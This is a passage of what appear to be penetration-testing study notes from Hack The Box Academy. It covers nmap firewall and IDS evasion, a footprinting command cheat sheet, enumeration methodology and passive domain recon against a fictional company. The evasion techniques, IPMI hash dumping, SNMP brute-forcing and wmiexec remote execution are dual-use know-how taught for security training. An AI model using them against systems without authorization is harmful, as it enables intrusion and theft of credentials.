(96%), Linux 3.4 - 3.10 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Synology DiskStation Manager 5.2-5644 (94%), Linux 2.6.32 - 2.6.35 (94%), Linux 2.6.32 - 3.5 (94%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 1 hop\n\nOS detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 4.11 seconds\n```\n\n|**Scanning Options**|**Description**|\n|---|---|\n|`10.129.2.28`|Scans the specified target.|\n|`-n`|Disables DNS resolution.|\n|`-Pn`|Disables ICMP Echo requests.|\n|`-p 445`|Scans only the specified ports.|\n|`-O`|Performs operation system detection scan.|\n|`-S`|Scans the target by using different source IP address.|\n|`10.129.2.200`|Specifies the source IP address.|\n|`-e tun0`|Sends all requests through the specified interface.|\n\n---\n\n## DNS Proxying\n\nBy default, `Nmap` performs a reverse DNS resolution unless otherwise specified to find more important information about our target. These DNS queries are also passed in most cases because the given web server is supposed to be found and visited. The DNS queries are made over the `UDP port 53`. The `TCP port 53` was previously only used for the so-called \"`Zone transfers`\" between the DNS servers or data transfer larger than 512 bytes. More and more, this is changing due to IPv6 and DNSSEC expansions. These changes cause many DNS requests to be made via TCP port 53.\n\nHowever, `Nmap` still gives us a way to specify DNS servers ourselves (`--dns-server <ns>,<ns>`). This method could be fundamental to us if we are in a demilitarized zone (`DMZ`). The company's DNS servers are usually more trusted than those from the Internet. So, for example, we could use them to interact with the hosts of the internal network. As another example, we can use `TCP port 53` as a source port (`--source-port`) for our scans. If the administrator uses the firewall to control this port and does not filter IDS/IPS properly, our TCP packets will be trusted and passed through.\n\n#### SYN-Scan of a Filtered Port\n\nFirewall and IDS/IPS Evasion\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo nmap 10.129.2.28 -p50000 -sS -Pn -n --disable-arp-ping --packet-trace\n\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-21 22:50 CEST\nSENT (0.0417s) TCP 10.10.14.2:33436 > 10.129.2.28:50000 S ttl=41 id=21939 iplen=44  seq=736533153 win=1024 <mss 1460>\nSENT (1.0481s) TCP 10.10.14.2:33437 > 10.129.2.28:50000 S ttl=46 id=6446 iplen=44  seq=736598688 win=1024 <mss 1460>\nNmap scan report for 10.129.2.28\nHost is up.\n\nPORT      STATE    SERVICE\n50000/tcp filtered ibm-db2\n\nNmap done: 1 IP address (1 host up) scanned in 2.06 seconds\n```\n\n#### SYN-Scan From DNS Port\n\nFirewall and IDS/IPS Evasion\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo nmap 10.129.2.28 -p50000 -sS -Pn -n --disable-arp-ping --packet-trace --source-port 53\n\nSENT (0.0482s) TCP 10.10.14.2:53 > 10.129.2.28:50000 S ttl=58 id=27470 iplen=44  seq=4003923435 win=1024 <mss 1460>\nRCVD (0.0608s) TCP 10.129.2.28:50000 > 10.10.14.2:53 SA ttl=64 id=0 iplen=44  seq=540635485 win=64240 <mss 1460>\nNmap scan report for 10.129.2.28\nHost is up (0.013s latency).\n\nPORT      STATE SERVICE\n50000/tcp open  ibm-db2\nMAC Address: DE:AD:00:00:BE:EF (Intel Corporate)\n\nNmap done: 1 IP address (1 host up) scanned in 0.08 seconds\n```\n\n|**Scanning Options**|**Description**|\n|---|---|\n|`10.129.2.28`|Scans the specified target.|\n|`-p 50000`|Scans only the specified ports.|\n|`-sS`|Performs SYN scan on specified ports.|\n|`-Pn`|Disables ICMP Echo requests.|\n|`-n`|Disables DNS resolution.|\n|`--disable-arp-ping`|Disables ARP ping.|\n|`--packet-trace`|Shows all packets sent and received.|\n|`--source-port 53`|Performs the scans from specified source port.|\n\n---\n\nNow that we have found out that the firewall accepts `TCP port 53`, it is very likely that IDS/IPS filters might also be configured much weaker than others. We can test this by trying to connect to this port by using `Netcat`.\n\n#### Connect To The Filtered Port\n\nFirewall and IDS/IPS Evasion\n\n```shell-session\ndrxh3kr@htb[/htb]$ ncat -nv --source-port 53 10.129.2.28 50000\n\nNcat: Version 7.80 ( https://nmap.org/ncat )\nNcat: Connected to 10.129.2.28:50000.\n220 ProFTPd\n```\n\n---\n\n## Firewall and IDS/IPS Evasion Labs\n\nIn the next three sections, we get different scenarios to practice where we have to scan our target. Firewall rules and IDS/IPS protect the systems, so we need to use the techniques shown to bypass the firewall rules and do this as quiet as possible. Otherwise, we will be blocked by IPS.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/03-Footprinting/01- Cheet sheet Footprinting",
    "path": "02_CPTS/03-Footprinting/01- Cheet sheet Footprinting.md",
    "title": "01  Cheet Sheet Footprinting",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Infrastructure-based Enumeration |Command|Description| |---|---| |curl -s https://crt.sh/\\?q\\=<target-domain>\\&output\\=json \\| jq .|Certificate transparency.| |for i in $(cat ip-addresses.txt);do shod...",
    "category": "02_CPTS",
    "content": "## Infrastructure-based Enumeration\n\n|**Command**|**Description**|\n|---|---|\n|`curl -s https://crt.sh/\\?q\\=<target-domain>\\&output\\=json \\| jq .`|Certificate transparency.|\n|`for i in $(cat ip-addresses.txt);do shodan host $i;done`|Scan each IP address in a list using Shodan.|\n\n---\n\n## Host-based Enumeration\n\n##### FTP\n\n|**Command**|**Description**|\n|---|---|\n|`ftp <FQDN/IP>`|Interact with the FTP service on the target.|\n|`nc -nv <FQDN/IP> 21`|Interact with the FTP service on the target.|\n|`telnet <FQDN/IP> 21`|Interact with the FTP service on the target.|\n|`openssl s_client -connect <FQDN/IP>:21 -starttls ftp`|Interact with the FTP service on the target using encrypted connection.|\n|`wget -m --no-passive ftp://anonymous:anonymous@<target>`|Download all available files on the target FTP server.|\n\n##### SMB\n\n|**Command**|**Description**|\n|---|---|\n|`smbclient -N -L //<FQDN/IP>`|Null session authentication on SMB.|\n|`smbclient //<FQDN/IP>/<share>`|Connect to a specific SMB share.|\n|`rpcclient -U \"\" <FQDN/IP>`|Interaction with the target using RPC.|\n|`samrdump.py <FQDN/IP>`|Username enumeration using Impacket scripts.|\n|`smbmap -H <FQDN/IP>`|Enumerating SMB shares.|\n|`nxc smb <FQDN/IP> --shares -u '' -p ''`|Enumerating SMB shares using null session authentication.|\n|`enum4linux-ng.py <FQDN/IP> -A`|SMB enumeration using enum4linux.|\n\n##### NFS\n\n|**Command**|**Description**|\n|---|---|\n|`showmount -e <FQDN/IP>`|Show available NFS shares.|\n|`mount -t nfs <FQDN/IP>:/<share> ./target-NFS/ -o nolock`|Mount the specific NFS share to ./target-NFS|\n|`umount ./target-NFS`|Unmount the specific NFS share.|\n\n##### DNS\n\n|**Command**|**Description**|\n|---|---|\n|`dig ns <domain.tld> @<nameserver>`|NS request to the specific nameserver.|\n|`dig any <domain.tld> @<nameserver>`|ANY request to the specific nameserver.|\n|`dig axfr <domain.tld> @<nameserver>`|AXFR request to the specific nameserver.|\n|`dnsenum --dnsserver <nameserver> --enum -p 0 -s 0 -o found_subdomains.txt -f ~/subdomains.list <domain.tld>`|Subdomain brute forcing.|\n\n##### SMTP\n\n|**Command**|**Description**|\n|---|---|\n|`telnet <FQDN/IP> 25`||\n\n##### IMAP/POP3\n\n|**Command**|**Description**|\n|---|---|\n|`curl -k 'imaps://<FQDN/IP>' --user <user>:<password>`|Log in to the IMAPS service using cURL.|\n|`openssl s_client -connect <FQDN/IP>:imaps`|Connect to the IMAPS service.|\n|`openssl s_client -connect <FQDN/IP>:pop3s`|Connect to the POP3s service.|\n\n##### SNMP\n\n|**Command**|**Description**|\n|---|---|\n|`snmpwalk -v2c -c <community string> <FQDN/IP>`|Querying OIDs using snmpwalk.|\n|`onesixtyone -c community-strings.list <FQDN/IP>`|Bruteforcing community strings of the SNMP service.|\n|`braa <community string>@<FQDN/IP>:.1.*`|Bruteforcing SNMP service OIDs.|\n\n##### MySQL\n\n|**Command**|**Description**|\n|---|---|\n|`mysql -u <user> -p<password> -h <FQDN/IP>`|Login to the MySQL server.|\n\n##### MSSQL\n\n|**Command**|**Description**|\n|---|---|\n|`mssqlclient.py <user>@<FQDN/IP> -windows-auth`|Log in to the MSSQL server using Windows authentication.|\n\n##### IPMI\n\n|**Command**|**Description**|\n|---|---|\n|`msf6 auxiliary(scanner/ipmi/ipmi_version)`|IPMI version detection.|\n|`msf6 auxiliary(scanner/ipmi/ipmi_dumphashes)`|Dump IPMI hashes.|\n\n##### Linux Remote Management\n\n|**Command**|**Description**|\n|---|---|\n|`ssh-audit.py <FQDN/IP>`|Remote security audit against the target SSH service.|\n|`ssh <user>@<FQDN/IP>`|Log in to the SSH server using the SSH client.|\n|`ssh -i private.key <user>@<FQDN/IP>`|Log in to the SSH server using private key.|\n|`ssh <user>@<FQDN/IP> -o PreferredAuthentications=password`|Enforce password-based authentication.|\n\n##### Windows Remote Management\n\n|**Command**|**Description**|\n|---|---|\n|`rdp-sec-check.pl <FQDN/IP>`|Check the security settings of the RDP service.|\n|`xfreerdp /u:<user> /p:\"<password>\" /v:<FQDN/IP>`|Log in to the RDP server from Linux.|\n|`evil-winrm -i <FQDN/IP> -u <user> -p <password>`|Log in to the WinRM server.|\n|`wmiexec.py <user>:\"<password>\"@<FQDN/IP> \"<system command>\"`|Execute command using the WMI service.|\n\n##### Oracle TNS\n\n| **Command**                                                                                                          | **Description**                                                                                         |\n| -------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------- |\n| `./odat.py all -s <FQDN/IP>`                                                                                         | Perform a variety of scans to gather information about the Oracle database services and its components. |\n| `sqlplus <user>/<pass>@<FQDN/IP>/<db>`                                                                               | Log in to the Oracle database.                                                                          |\n| `./odat.py utlfile -s <FQDN/IP> -d <db> -U <user> -P <pass> --sysdba --putFile C:\\\\insert\\\\path file.txt ./file.txt` | Upload a file with Oracle RDBMS.                                                                        |",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/03-Footprinting/02-Enumeration Principles",
    "path": "02_CPTS/03-Footprinting/02-Enumeration Principles.md",
    "title": "02 Enumeration Principles",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Enumeration is a widely used term in cyber security. It stands for information gathering using active (scans) and passive (use of third-party providers) methods. It is important to note that OSINT is ...",
    "category": "02_CPTS",
    "content": "Enumeration is a widely used term in cyber security. It stands for information gathering using active (scans) and passive (use of third-party providers) methods. It is important to note that OSINT is an independent procedure and should be performed separately from enumeration because `OSINT is based exclusively on passive information gathering` and does not involve active enumeration of the given target. Enumeration is a loop in which we repeatedly gather information based on what data we have or have already discovered.\n\nInformation can be gathered from domains, IP addresses, accessible services, and many other sources.\n\nOnce we have identified targets in our client's infrastructure, we need to examine the individual services and protocols. In most cases, these are services that enable communication between customers, the infrastructure, the administration, and the employees.\n\nIf we imagine that we have been hired to investigate the IT security of a company, we will start to develop a general understanding of the company's functionality. For example, we need to understand how the company is structured, what services and third-party vendors it uses, what security measures may be in place, and more. This is where this stage can be a bit misunderstood because most people focus on the obvious and try to force their way into the company's systems instead of understanding how the infrastructure is set up and what technical aspects and services are necessary to be able to offer a specific service.\n\nAn example of such a wrong approach could be that after finding authentication services like SSH, RDP, WinRM, and the like, we try to brute-force with common/weak passwords and usernames. Unfortunately, brute-forcing is a noisy method and can easily lead to blacklisting, making further testing impossible. Primarily, this can happen if we do not know about the company's defensive security measures and its infrastructure. Some may smile at this approach, but experience has shown that far too many testers take this type of approach.\n\n`Our goal is not to get at the systems but to find all the ways to get there.`\n\nWe can think of this as an analogy of a treasure hunter preparing for his expedition. He would not just grab a shovel and start digging in some random spot, but he would plan and gather his gear and study maps and learn about the terrain he has to cover and where the treasure may be so he can bring the proper tools. If he goes around digging holes everywhere, he will cause damage, waste time and energy, and likely never achieve his goal. The same can be said for understanding a company's internal and external infrastructure, mapping it out, and carefully formulating our plan of attack.\n\nThe enumeration principles are based on some questions that will facilitate all our investigations in any conceivable situation. In most cases, the main focus of many penetration testers is on what they can see and not on what they cannot see. However, even what we cannot see is relevant to us and may well be of great importance. The difference here is that we start to see the components and aspects that are not visible at first glance with our experience.\n\n- What can we see?\n- What reasons can we have for seeing it?\n- What image does what we see create for us?\n- What do we gain from it?\n- How can we use it?\n- What can we not see?\n- What reasons can there be that we do not see?\n- What image results for us from what we do not see?\n\nAn important aspect that must not be confused here is that there are always exceptions to the rules. The principles, however, do not change. Another advantage of these principles is that we can see from the practical tasks that we do not lack penetration testing abilities but technical understanding when we suddenly do not know how to proceed because our core task is not to exploit the machines but to find how they can be exploited.\n\n|**`No.`**|**`Principle`**|\n|---|---|\n|1.|There is more than meets the eye. Consider all points of view.|\n|2.|Distinguish between what we see and what we do not see.|\n|3.|There are always ways to gain more information. Understand the target.|\n\nTo familiarize ourselves with these principles, we should write down these questions and principles where we can always see them and refer back to them with ease.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/03-Footprinting/03-Enumeration Methodology",
    "path": "02_CPTS/03-Footprinting/03-Enumeration Methodology.md",
    "title": "03 Enumeration Methodology",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Complex processes must have a standardized methodology that helps us keep our bearings and avoid omitting any aspects by mistake. Especially with the variety of cases that the target systems can offer...",
    "category": "02_CPTS",
    "content": "Complex processes must have a standardized methodology that helps us keep our bearings and avoid omitting any aspects by mistake. Especially with the variety of cases that the target systems can offer us, it is almost unpredictable how our approach should be designed. Therefore, most penetration testers follow their habits and the steps they feel most comfortable and familiar with. However, this is not a standardized methodology but rather an experience-based approach.\n\nWe know that penetration testing, and therefore enumeration, is a dynamic process. Consequently, we have developed a static enumeration methodology for external and internal penetration tests that includes free dynamics and allows for a wide range of changes and adaptations to the given environment. This methodology is nested in 6 layers and represents, metaphorically speaking, boundaries that we try to pass with the enumeration process. The whole enumeration process is divided into three different levels:\n\n|`Infrastructure-based enumeration`|`Host-based enumeration`|`OS-based enumeration`|\n|---|---|---|\n\n![Flowchart illustrating enumeration processes: OS-based, host-based, and infrastructure-based. It includes OS setup, privileges, processes, accessible services, gateway, and internet presence, with detailed subcategories like OS type, network config, users, tasks, service type, firewalls, and domains.](https://academy.hackthebox.com/storage/modules/112/enum-method3.png)\n\nNote: The components of each layer shown represent the main categories and not a full list of all the components to search for. Additionally, it must be mentioned here that the first and second layer (Internet Presence, Gateway) does not quite apply to the intranet, such as an Active Directory infrastructure. The layers for internal infrastructure will be covered in other modules.\n\nConsider these lines as some kind of obstacle, like a wall, for example. What we do here is look around to find out where the entrance is, or the gap we can fit through, or climb over to get closer to our goal. Theoretically, it is also possible to go through the wall headfirst, but very often, it happens that the spot we have smashed the gap with a lot of effort and time with force does not bring us much because there is no entry at this point of the wall to pass on to the next wall.\n\nThese layers are designed as follows:\n\n|**Layer**|**Description**|**Information Categories**|\n|---|---|---|\n|`1. Internet Presence`|Identification of internet presence and externally accessible infrastructure.|Domains, Subdomains, vHosts, ASN, Netblocks, IP Addresses, Cloud Instances, Security Measures|\n|`2. Gateway`|Identify the possible security measures to protect the company's external and internal infrastructure.|Firewalls, DMZ, IPS/IDS, EDR, Proxies, NAC, Network Segmentation, VPN, Cloudflare|\n|`3. Accessible Services`|Identify accessible interfaces and services that are hosted externally or internally.|Service Type, Functionality, Configuration, Port, Version, Interface|\n|`4. Processes`|Identify the internal processes, sources, and destinations associated with the services.|PID, Processed Data, Tasks, Source, Destination|\n|`5. Privileges`|Identification of the internal permissions and privileges to the accessible services.|Groups, Users, Permissions, Restrictions, Environment|\n|`6. OS Setup`|Identification of the internal components and systems setup.|OS Type, Patch Level, Network config, OS Environment, Configuration files, sensitive private files|\n\nImportant note: The human aspect and the information that can be obtained by employees using OSINT have been removed from the \"Internet Presence\" layer for simplicity.\n\nWe can finally imagine the entire penetration test in the form of a labyrinth where we have to identify the gaps and find the way to get us inside as quickly and effectively as possible. This type of labyrinth may look something like this:\n\n![Color-coded concentric circles with connecting lines and squares, labeled 'Starting Point,' representing a flowchart or process diagram.](https://academy.hackthebox.com/storage/modules/112/pentest-labyrinth.png)\n\nThe squares represent the gaps/vulnerabilities.\n\nAs we have probably already noticed, we can see that we will encounter one gap and very likely several. The interesting and very common fact is that not all the gaps we find can lead us inside. All penetration tests are limited in time, but we should always keep in mind that one belief that there is nearly always a way in. Even after a four-week penetration test, we cannot say 100% that there are no more vulnerabilities. Someone who has been studying the company for months and analyzing them will most likely have a much greater understanding of the applications and structure than we were able to gain within the few weeks we spent on the assessment. An excellent and recent example of this is the [cyber attack on SolarWinds](https://www.rpc.senate.gov/policy-papers/the-solarwinds-cyberattack), which happened not too long ago. This is another excellent reason for a methodology that must exclude such cases.\n\nLet us assume that we have been asked to perform an external \"black box\" penetration test. Once all the necessary contract items have been completely fulfilled, our penetration test will begin at the specified time.\n\n---\n\n## Layer No.1: Internet Presence\n\nThe first layer we have to pass is the \"Internet Presence\" layer, where we focus on finding the targets we can investigate. If the scope in the contract allows us to look for additional hosts, this layer is even more critical than for fixed targets only. In this layer, we use different techniques to find domains, subdomains, netblocks, and many other components and information that present the presence of the company and its infrastructure on the Internet.\n\n`The goal of this layer is to identify all possible target systems and interfaces that can be tested.`\n\n---\n\n## Layer No.2: Gateway\n\nHere we try to understand the interface of the reachable target, how it is protected, and where it is located in the network. Due to the diversity, different functionalities, and some particular procedures, we will go into more detail about this layer in other modules.\n\n`The goal is to understand what we are dealing with and what we have to watch out for.`\n\n---\n\n## Layer No.3: Accessible Services\n\nIn the case of accessible services, we examine each destination for all the services it offers. Each of these services has a specific purpose that has been installed for a particular reason by the administrator. Each service has certain functions, which therefore also lead to specific results. To work effectively with them, we need to know how they work. Otherwise, we need to learn to understand them.\n\n`This layer aims to understand the reason and functionality of the target system and gain the necessary knowledge to communicate with it and exploit it for our purposes effectively.`\n\nThis is the part of enumeration we will mainly deal with in this module.\n\n---\n\n## Layer No.4: Processes\n\nEvery time a command or function is executed, data is processed, whether entered by the user or generated by the system. This starts a process that has to perform specific tasks, and such tasks have at least one source and one target.\n\n`The goal here is to understand these factors and identify the dependencies between them.`\n\n---\n\n## Layer No.5: Privileges\n\nEach service runs through a specific user in a particular group with permissions and privileges defined by the administrator or the system. These privileges often provide us with functions that administrators overlook. This often happens in Active Directory infrastructures and many other case-specific administration environments and servers where users are responsible for multiple administration areas.\n\n`It is crucial to identify these and understand what is and is not possible with these privileges.`\n\n---\n\n## Layer No.6: OS Setup\n\nHere we collect information about the actual operating system and its setup using internal access. This gives us a good overview of the internal security of the systems and reflects the skills and capabilities of the company's administrative teams.\n\n`The goal here is to see how the administrators manage the systems and what sensitive internal information we can glean from them.`\n\n---\n\n## Enumeration Methodology in Practice\n\nA methodology summarizes all systematic procedures in obtaining knowledge within the bounds of a given objective. It is important to note that a methodology is not a step-by-step guide but, as the definition implies, a summary of systematic procedures. In our case, the enumeration methodology is the systematic approach to explore a given target.\n\nHow the individual components are identified and information obtained in this methodology is a dynamic and growing aspect that is constantly changing and can therefore differ. An excellent example of this is using information-gathering tools from web servers. There are countless different tools for this, and each of them has a specific focus and therefore delivers individual results that differ from other applications. The goal, however, is the same. Thus, the collection of tools and commands is not part of the actual methodology but rather a cheat sheet that we can refer to using the commands and tools listed in given cases.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/03-Footprinting/04-Domain Information",
    "path": "02_CPTS/03-Footprinting/04-Domain Information.md",
    "title": "04 Domain Information",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Domain information is a core component of any penetration test, and it is not just about the subdomains but about the entire presence on the Internet. Therefore, we gather information and try to under...",
    "category": "02_CPTS",
    "content": "Domain information is a core component of any penetration test, and it is not just about the subdomains but about the entire presence on the Internet. Therefore, we gather information and try to understand the company's functionality and which technologies and structures are necessary for services to be offered successfully and efficiently.\n\nThis type of information is gathered passively without direct and active scans. In other words, we remain hidden and navigate as \"customers\" or \"visitors\" to avoid direct connections to the company that could expose us. The OSINT relevant sections are only a tiny part of how in-depth OSINT goes and describe only a few of the many ways to obtain information in this way. More approaches and strategies for this can be found in the module [OSINT: Corporate Recon](https://academy.hackthebox.com/course/preview/osint-corporate-recon).\n\nHowever, when `passively` gathering information, we can use third-party services to understand the company better. However, the first thing we should do is scrutinize the company's `main website`. Then, we should read through the texts, keeping in mind what technologies and structures are needed for these services.\n\nFor example, many IT companies offer app development, IoT, hosting, data science, and IT security services, depending on their industry. If we encounter a service that we have had little to do with before, it makes sense and is necessary to get to grips with it and find out what activities it consists of and what opportunities are available. Those services also give us a good overview of how the company can be structured.\n\nFor example, this part is the combination between the `first principle` and the `second principle` of enumeration. We pay attention to what `we see` and `we do not see`. We see the services but not their functionality. However, services are bound to certain technical aspects necessary to provide a service. Therefore, we take the developer's view and look at the whole thing from their point of view. This point of view allows us to gain many technical insights into the functionality.\n\n---\n\n## Online Presence\n\nOnce we have a basic understanding of the company and its services, we can get a first impression of its presence on the Internet. Let us assume that a medium-sized company has hired us to test their entire infrastructure from a black-box perspective. This means we have only received a scope of targets and must obtain all further information ourselves.\n\nNote: Please remember that the examples below will differ from the practical exercises and will not give the same results. However, the examples are based on real penetration tests and illustrate how and what information can be obtained.\n\nThe first point of presence on the Internet may be the `SSL certificate` from the company's main website that we can examine. Often, such a certificate includes more than just a subdomain, and this means that the certificate is used for several domains, and these are most likely still active.\n\n![Certificate validity from May 18, 2021, to April 6, 2022, with DNS names: inlanefreight.htb, www.inlanefreight.htb, support.inlanefreight.htb.](https://academy.hackthebox.com/storage/modules/112/DomInfo-1.png)\n\nAnother source to find more subdomains is [crt.sh](https://crt.sh/). This source is [Certificate Transparency](https://en.wikipedia.org/wiki/Certificate_Transparency) logs. Certificate Transparency is a process that is intended to enable the verification of issued digital certificates for encrypted Internet connections. The standard ([RFC 6962](https://tools.ietf.org/html/rfc6962)) provides for the logging of all digital certificates issued by a certificate authority in audit-proof logs. This is intended to enable the detection of false or maliciously issued certificates for a domain. SSL certificate providers like [Let's Encrypt](https://letsencrypt.org/) share this with the web interface [crt.sh](https://crt.sh/), which stores the new entries in the database to be accessed later.\n\n![crt.sh search results for 'inlanefreight.com' showing certificates with common names like matomo.inlanefreight.com, smartfactory.inlanefreight.com, and issuer names including Let's Encrypt and Cloudflare.](https://academy.hackthebox.com/storage/modules/112/DomInfo-2.png)\n\nWe can also output the results in JSON format.\n\n#### Certificate Transparency\n\nDomain Information\n\n```shell-session\ndrxh3kr@htb[/htb]$ curl -s https://crt.sh/\\?q\\=inlanefreight.com\\&output\\=json | jq .\n\n[\n  {\n    \"issuer_ca_id\": 23451835427,\n    \"issuer_name\": \"C=US, O=Let's Encrypt, CN=R3\",\n    \"common_name\": \"matomo.inlanefreight.com\",\n    \"name_value\": \"matomo.inlanefreight.com\",\n    \"id\": 50815783237226155,\n    \"entry_timestamp\": \"2021-08-21T06:00:17.173\",\n    \"not_before\": \"2021-08-21T05:00:16\",\n    \"not_after\": \"2021-11-19T05:00:15\",\n    \"serial_number\": \"03abe9017d6de5eda90\"\n  },\n  {\n    \"issuer_ca_id\": 6864563267,\n    \"issuer_name\": \"C=US, O=Let's Encrypt, CN=R3\",\n    \"common_name\": \"matomo.inlanefreight.com\",\n    \"name_value\": \"matomo.inlanefreight.com\",\n    \"id\": 5081529377,\n    \"entry_timestamp\": \"2021-08-21T06:00:16.932\",\n    \"not_before\": \"2021-08-21T05:00:16\",\n    \"not_after\": \"2021-11-19T05:00:15\",\n    \"serial_number\": \"03abe90104e271c98a90\"\n  },\n  {\n    \"issuer_ca_id\": 113123452,\n    \"issuer_name\": \"C=US, O=Let's Encrypt, CN=R3\",\n    \"common_name\": \"smartfactory.inlanefreight.com\",\n    \"name_value\": \"smartfactory.inlanefreight.com\",\n    \"id\": 4941235512141012357,\n    \"entry_timestamp\": \"2021-07-27T00:32:48.071\",\n    \"not_before\": \"2021-07-26T23:32:47\",\n    \"not_after\": \"2021-10-24T23:32:45\",\n    \"serial_number\": \"044bac5fcc4d59329ecbbe9043dd9d5d0878\"\n  },\n  { ... SNIP ...\n```\n\nIf needed, we can also have them filtered by the unique subdomains.\n\nDomain Information\n\n```shell-session\ndrxh3kr@htb[/htb]$ curl -s https://crt.sh/\\?q\\=inlanefreight.com\\&output\\=json | jq . | grep name | cut -d\":\" -f2 | grep -v \"CN=\" | cut -d'\"' -f2 | awk '{gsub(/\\\\n/,\"\\n\");}1;' | sort -u\n\naccount.ttn.inlanefreight.com\nblog.inlanefreight.com\nbots.inlanefreight.com\nconsole.ttn.inlanefreight.com\nct.inlanefreight.com\ndata.ttn.inlanefreight.com\n*.inlanefreight.com\ninlanefreight.com\nintegrations.ttn.inlanefreight.com\niot.inlanefreight.com\nmails.inlanefreight.com\nmarina.inlanefreight.com\nmarina-live.inlanefreight.com\nmatomo.inlanefreight.com\nnext.inlanefreight.com\nnoc.ttn.inlanefreight.com\npreview.inlanefreight.com\nshop.inlanefreight.com\nsmartfactory.inlanefreight.com\nttn.inlanefreight.com\nvx.inlanefreight.com\nwww.inlanefreight.com\n```\n\nNext, we can identify the hosts directly accessible from the Internet and not hosted by third-party providers. This is because we are not allowed to test the hosts without the permission of third-party providers.\n\n#### Company Hosted Servers\n\nDomain Information\n\n```shell-session\ndrxh3kr@htb[/htb]$ for i in $(cat subdomainlist);do host $i | grep \"has address\" | grep inlanefreight.com | cut -d\" \" -f1,4;done\n\nblog.inlanefreight.com 10.129.24.93\ninlanefreight.com 10.129.27.33\nmatomo.inlanefreight.com 10.129.127.22\nwww.inlanefreight.com 10.129.127.33\ns3-website-us-west-2.amazonaws.com 10.129.95.250\n```\n\nOnce we see which hosts can be investigated further, we can generate a list of IP addresses with a minor adjustment to the `cut` command and run them through `Shodan`.\n\n[Shodan](https://www.shodan.io/) can be used to find devices and systems permanently connected to the Internet like `Internet of Things` (`IoT`). It searches the Internet for open TCP/IP ports and filters the systems according to specific terms and criteria. For example, open HTTP or HTTPS ports and other server ports for `FTP`, `SSH`, `SNMP`, `Telnet`, `RTSP`, or `SIP` are searched. As a result, we can find devices and systems, such as `surveillance cameras`, `servers`, `smart home systems`, `industrial controllers`, `traffic lights` and `traffic controllers`, and various network components.\n\n#### Shodan - IP List\n\nDomain Information\n\n```shell-session\ndrxh3kr@htb[/htb]$ for i in $(cat subdomainlist);do host $i | grep \"has address\" | grep inlanefreight.com | cut -d\" \" -f4 >> ip-addresses.txt;done\ndrxh3kr@htb[/htb]$ for i in $(cat ip-addresses.txt);do shodan host $i;done\n\n10.129.24.93\nCity:                    Berlin\nCountry:                 Germany\nOrganization:            InlaneFreight\nUpdated:                 2021-09-01T09:02:11.370085\nNumber of open ports:    2\n\nPorts:\n     80/tcp nginx \n    443/tcp nginx \n\t\n10.129.27.33\nCity:                    Berlin\nCountry:                 Germany\nOrganization:            InlaneFreight\nUpdated:                 2021-08-30T22:25:31.572717\nNumber of open ports:    3\n\nPorts:\n     22/tcp OpenSSH (7.6p1 Ubuntu-4ubuntu0.3)\n     80/tcp nginx \n    443/tcp nginx \n        |-- SSL Versions: -SSLv2, -SSLv3, -TLSv1, -TLSv1.1, -TLSv1.3, TLSv1.2\n        |-- Diffie-Hellman Parameters:\n                Bits:          2048\n                Generator:     2\n\t\t\t\t\n10.129.27.22\nCity:                    Berlin\nCountry:                 Germany\nOrganization:            InlaneFreight\nUpdated:                 2021-09-01T15:39:55.446281\nNumber of open ports:    8\n\nPorts:\n     25/tcp  \n        |-- SSL Versions: -SSLv2, -SSLv3, -TLSv1, -TLSv1.1, TLSv1.2, TLSv1.3\n     53/tcp  \n     53/udp  \n     80/tcp Apache httpd \n     81/tcp Apache httpd \n    110/tcp  \n        |-- SSL Versions: -SSLv2, -SSLv3, -TLSv1, -TLSv1.1, TLSv1.2\n    111/tcp  \n    443/tcp Apache httpd \n        |-- SSL Versions: -SSLv2, -SSLv3, -TLSv1, -TLSv1.1, TLSv1.2, TLSv1.3\n        |-- Diffie-Hellman Parameters:\n                Bits:          2048\n                Generator:     2\n                Fingerprint:   RFC3526/Oakley Group 14\n    444/tcp  \n\t\t\n10.129.27.33\nCity:                    Berlin\nCountry:                 Germany\nOrganization:            InlaneFreight\nUpdated:                 2021-08-30T22:25:31.572717\nNumber of open ports:    3\n\nPorts:\n     22/tcp OpenSSH (7.6p1 Ubuntu-4ubuntu0.3)\n     80/tcp nginx \n    443/tcp nginx \n        |-- SSL Versions: -SSLv2, -SSLv3, -TLSv1, -TLSv1.1, -TLSv1.3, TLSv1.2\n        |-- Diffie-Hellman Parameters:\n                Bits:          2048\n                Generator:     2\n```\n\nWe remember the IP `10.129.127.22` (`matomo.inlanefreight.com`) for later active investigations we want to perform. Now, we can display all the available DNS records where we might find more hosts.\n\n#### DNS Records\n\nDomain Information\n\n```shell-session\ndrxh3kr@htb[/htb]$ dig any inlanefreight.com\n\n; <<>> DiG 9.16.1-Ubuntu <<>> any inlanefreight.com\n;; global options: +cmd\n;; Got answer:\n;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 52058\n;; flags: qr rd ra; QUERY: 1, ANSWER: 17, AUTHORITY: 0, ADDITIONAL: 1\n\n;; OPT PSEUDOSECTION:\n; EDNS: version: 0, flags:; udp: 65494\n;; QUESTION SECTION:\n;inlanefreight.com.             IN      ANY\n\n;; ANSWER SECTION:\ninlanefreight.com.      300     IN      A       10.129.27.33\ninlanefreight.com.      300     IN      A       10.129.95.250\ninlanefreight.com.      3600    IN      MX      1 aspmx.l.google.com.\ninlanefreight.com.      3600    IN      MX      10 aspmx2.googlemail.com.\ninlanefreight.com.      3600    IN      MX      10 aspmx3.googlemail.com.\ninlanefreight.com.      3600    IN      MX      5 alt1.aspmx.l.google.com.\ninlanefreight.com.      3600    IN      MX      5 alt2.aspmx.l.google.com.\ninlanefreight.com.      21600   IN      NS      ns.inwx.net.\ninlanefreight.com.      21600   IN      NS      